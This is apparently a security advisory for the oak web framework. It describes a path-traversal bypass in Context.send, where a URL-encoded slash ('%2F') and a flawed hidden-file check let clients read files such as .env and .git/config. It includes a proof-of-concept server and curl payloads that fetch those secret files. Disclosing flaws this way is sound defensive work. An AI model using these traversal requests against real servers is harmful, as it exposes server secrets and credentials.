17.1.3

## Description

### Summary

By default `oak` does not allow transferring of hidden files with `Context.send` API. However, this can be bypassed by

encoding `/` as its URL encoded form `%2F`.

### Details

1.) Oak uses [decodeComponent](https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25) which seems to be unexpected. This is also the reason why it is not possible to access a file that

contains URL encoded characters unless the client URL encodes it first.

2.) The function [isHidden](https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125) is flawed since it only checks if the first subpath is hidden, allowing secrets to be read from `subdir/.env`.

### PoC

```
// server.ts

import { Application } from "jsr:@oak/oak@17.1.2";

const app = new Application();

app.use(async (context, next) => {
  try {
    await context.send({
      root: './root',
      hidden: false, // default
    });
  } catch {
    await next();
  }
});

await app.listen({ port: 8000 });
```

In terminal:

```
# setup root directory
mkdir root/.git
echo SECRET_KEY=oops > root/.env
echo oops >  root/.git/config

# start server
deno run -A server.ts

# in another terminal
curl -D- http://127.0.0.1:8000/poc%2f../.env
curl -D- http://127.0.0.1:8000/poc%2f../.git/config
```
### Impact

For an attacker this has potential to read sensitive user data or to gain access to server secrets.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
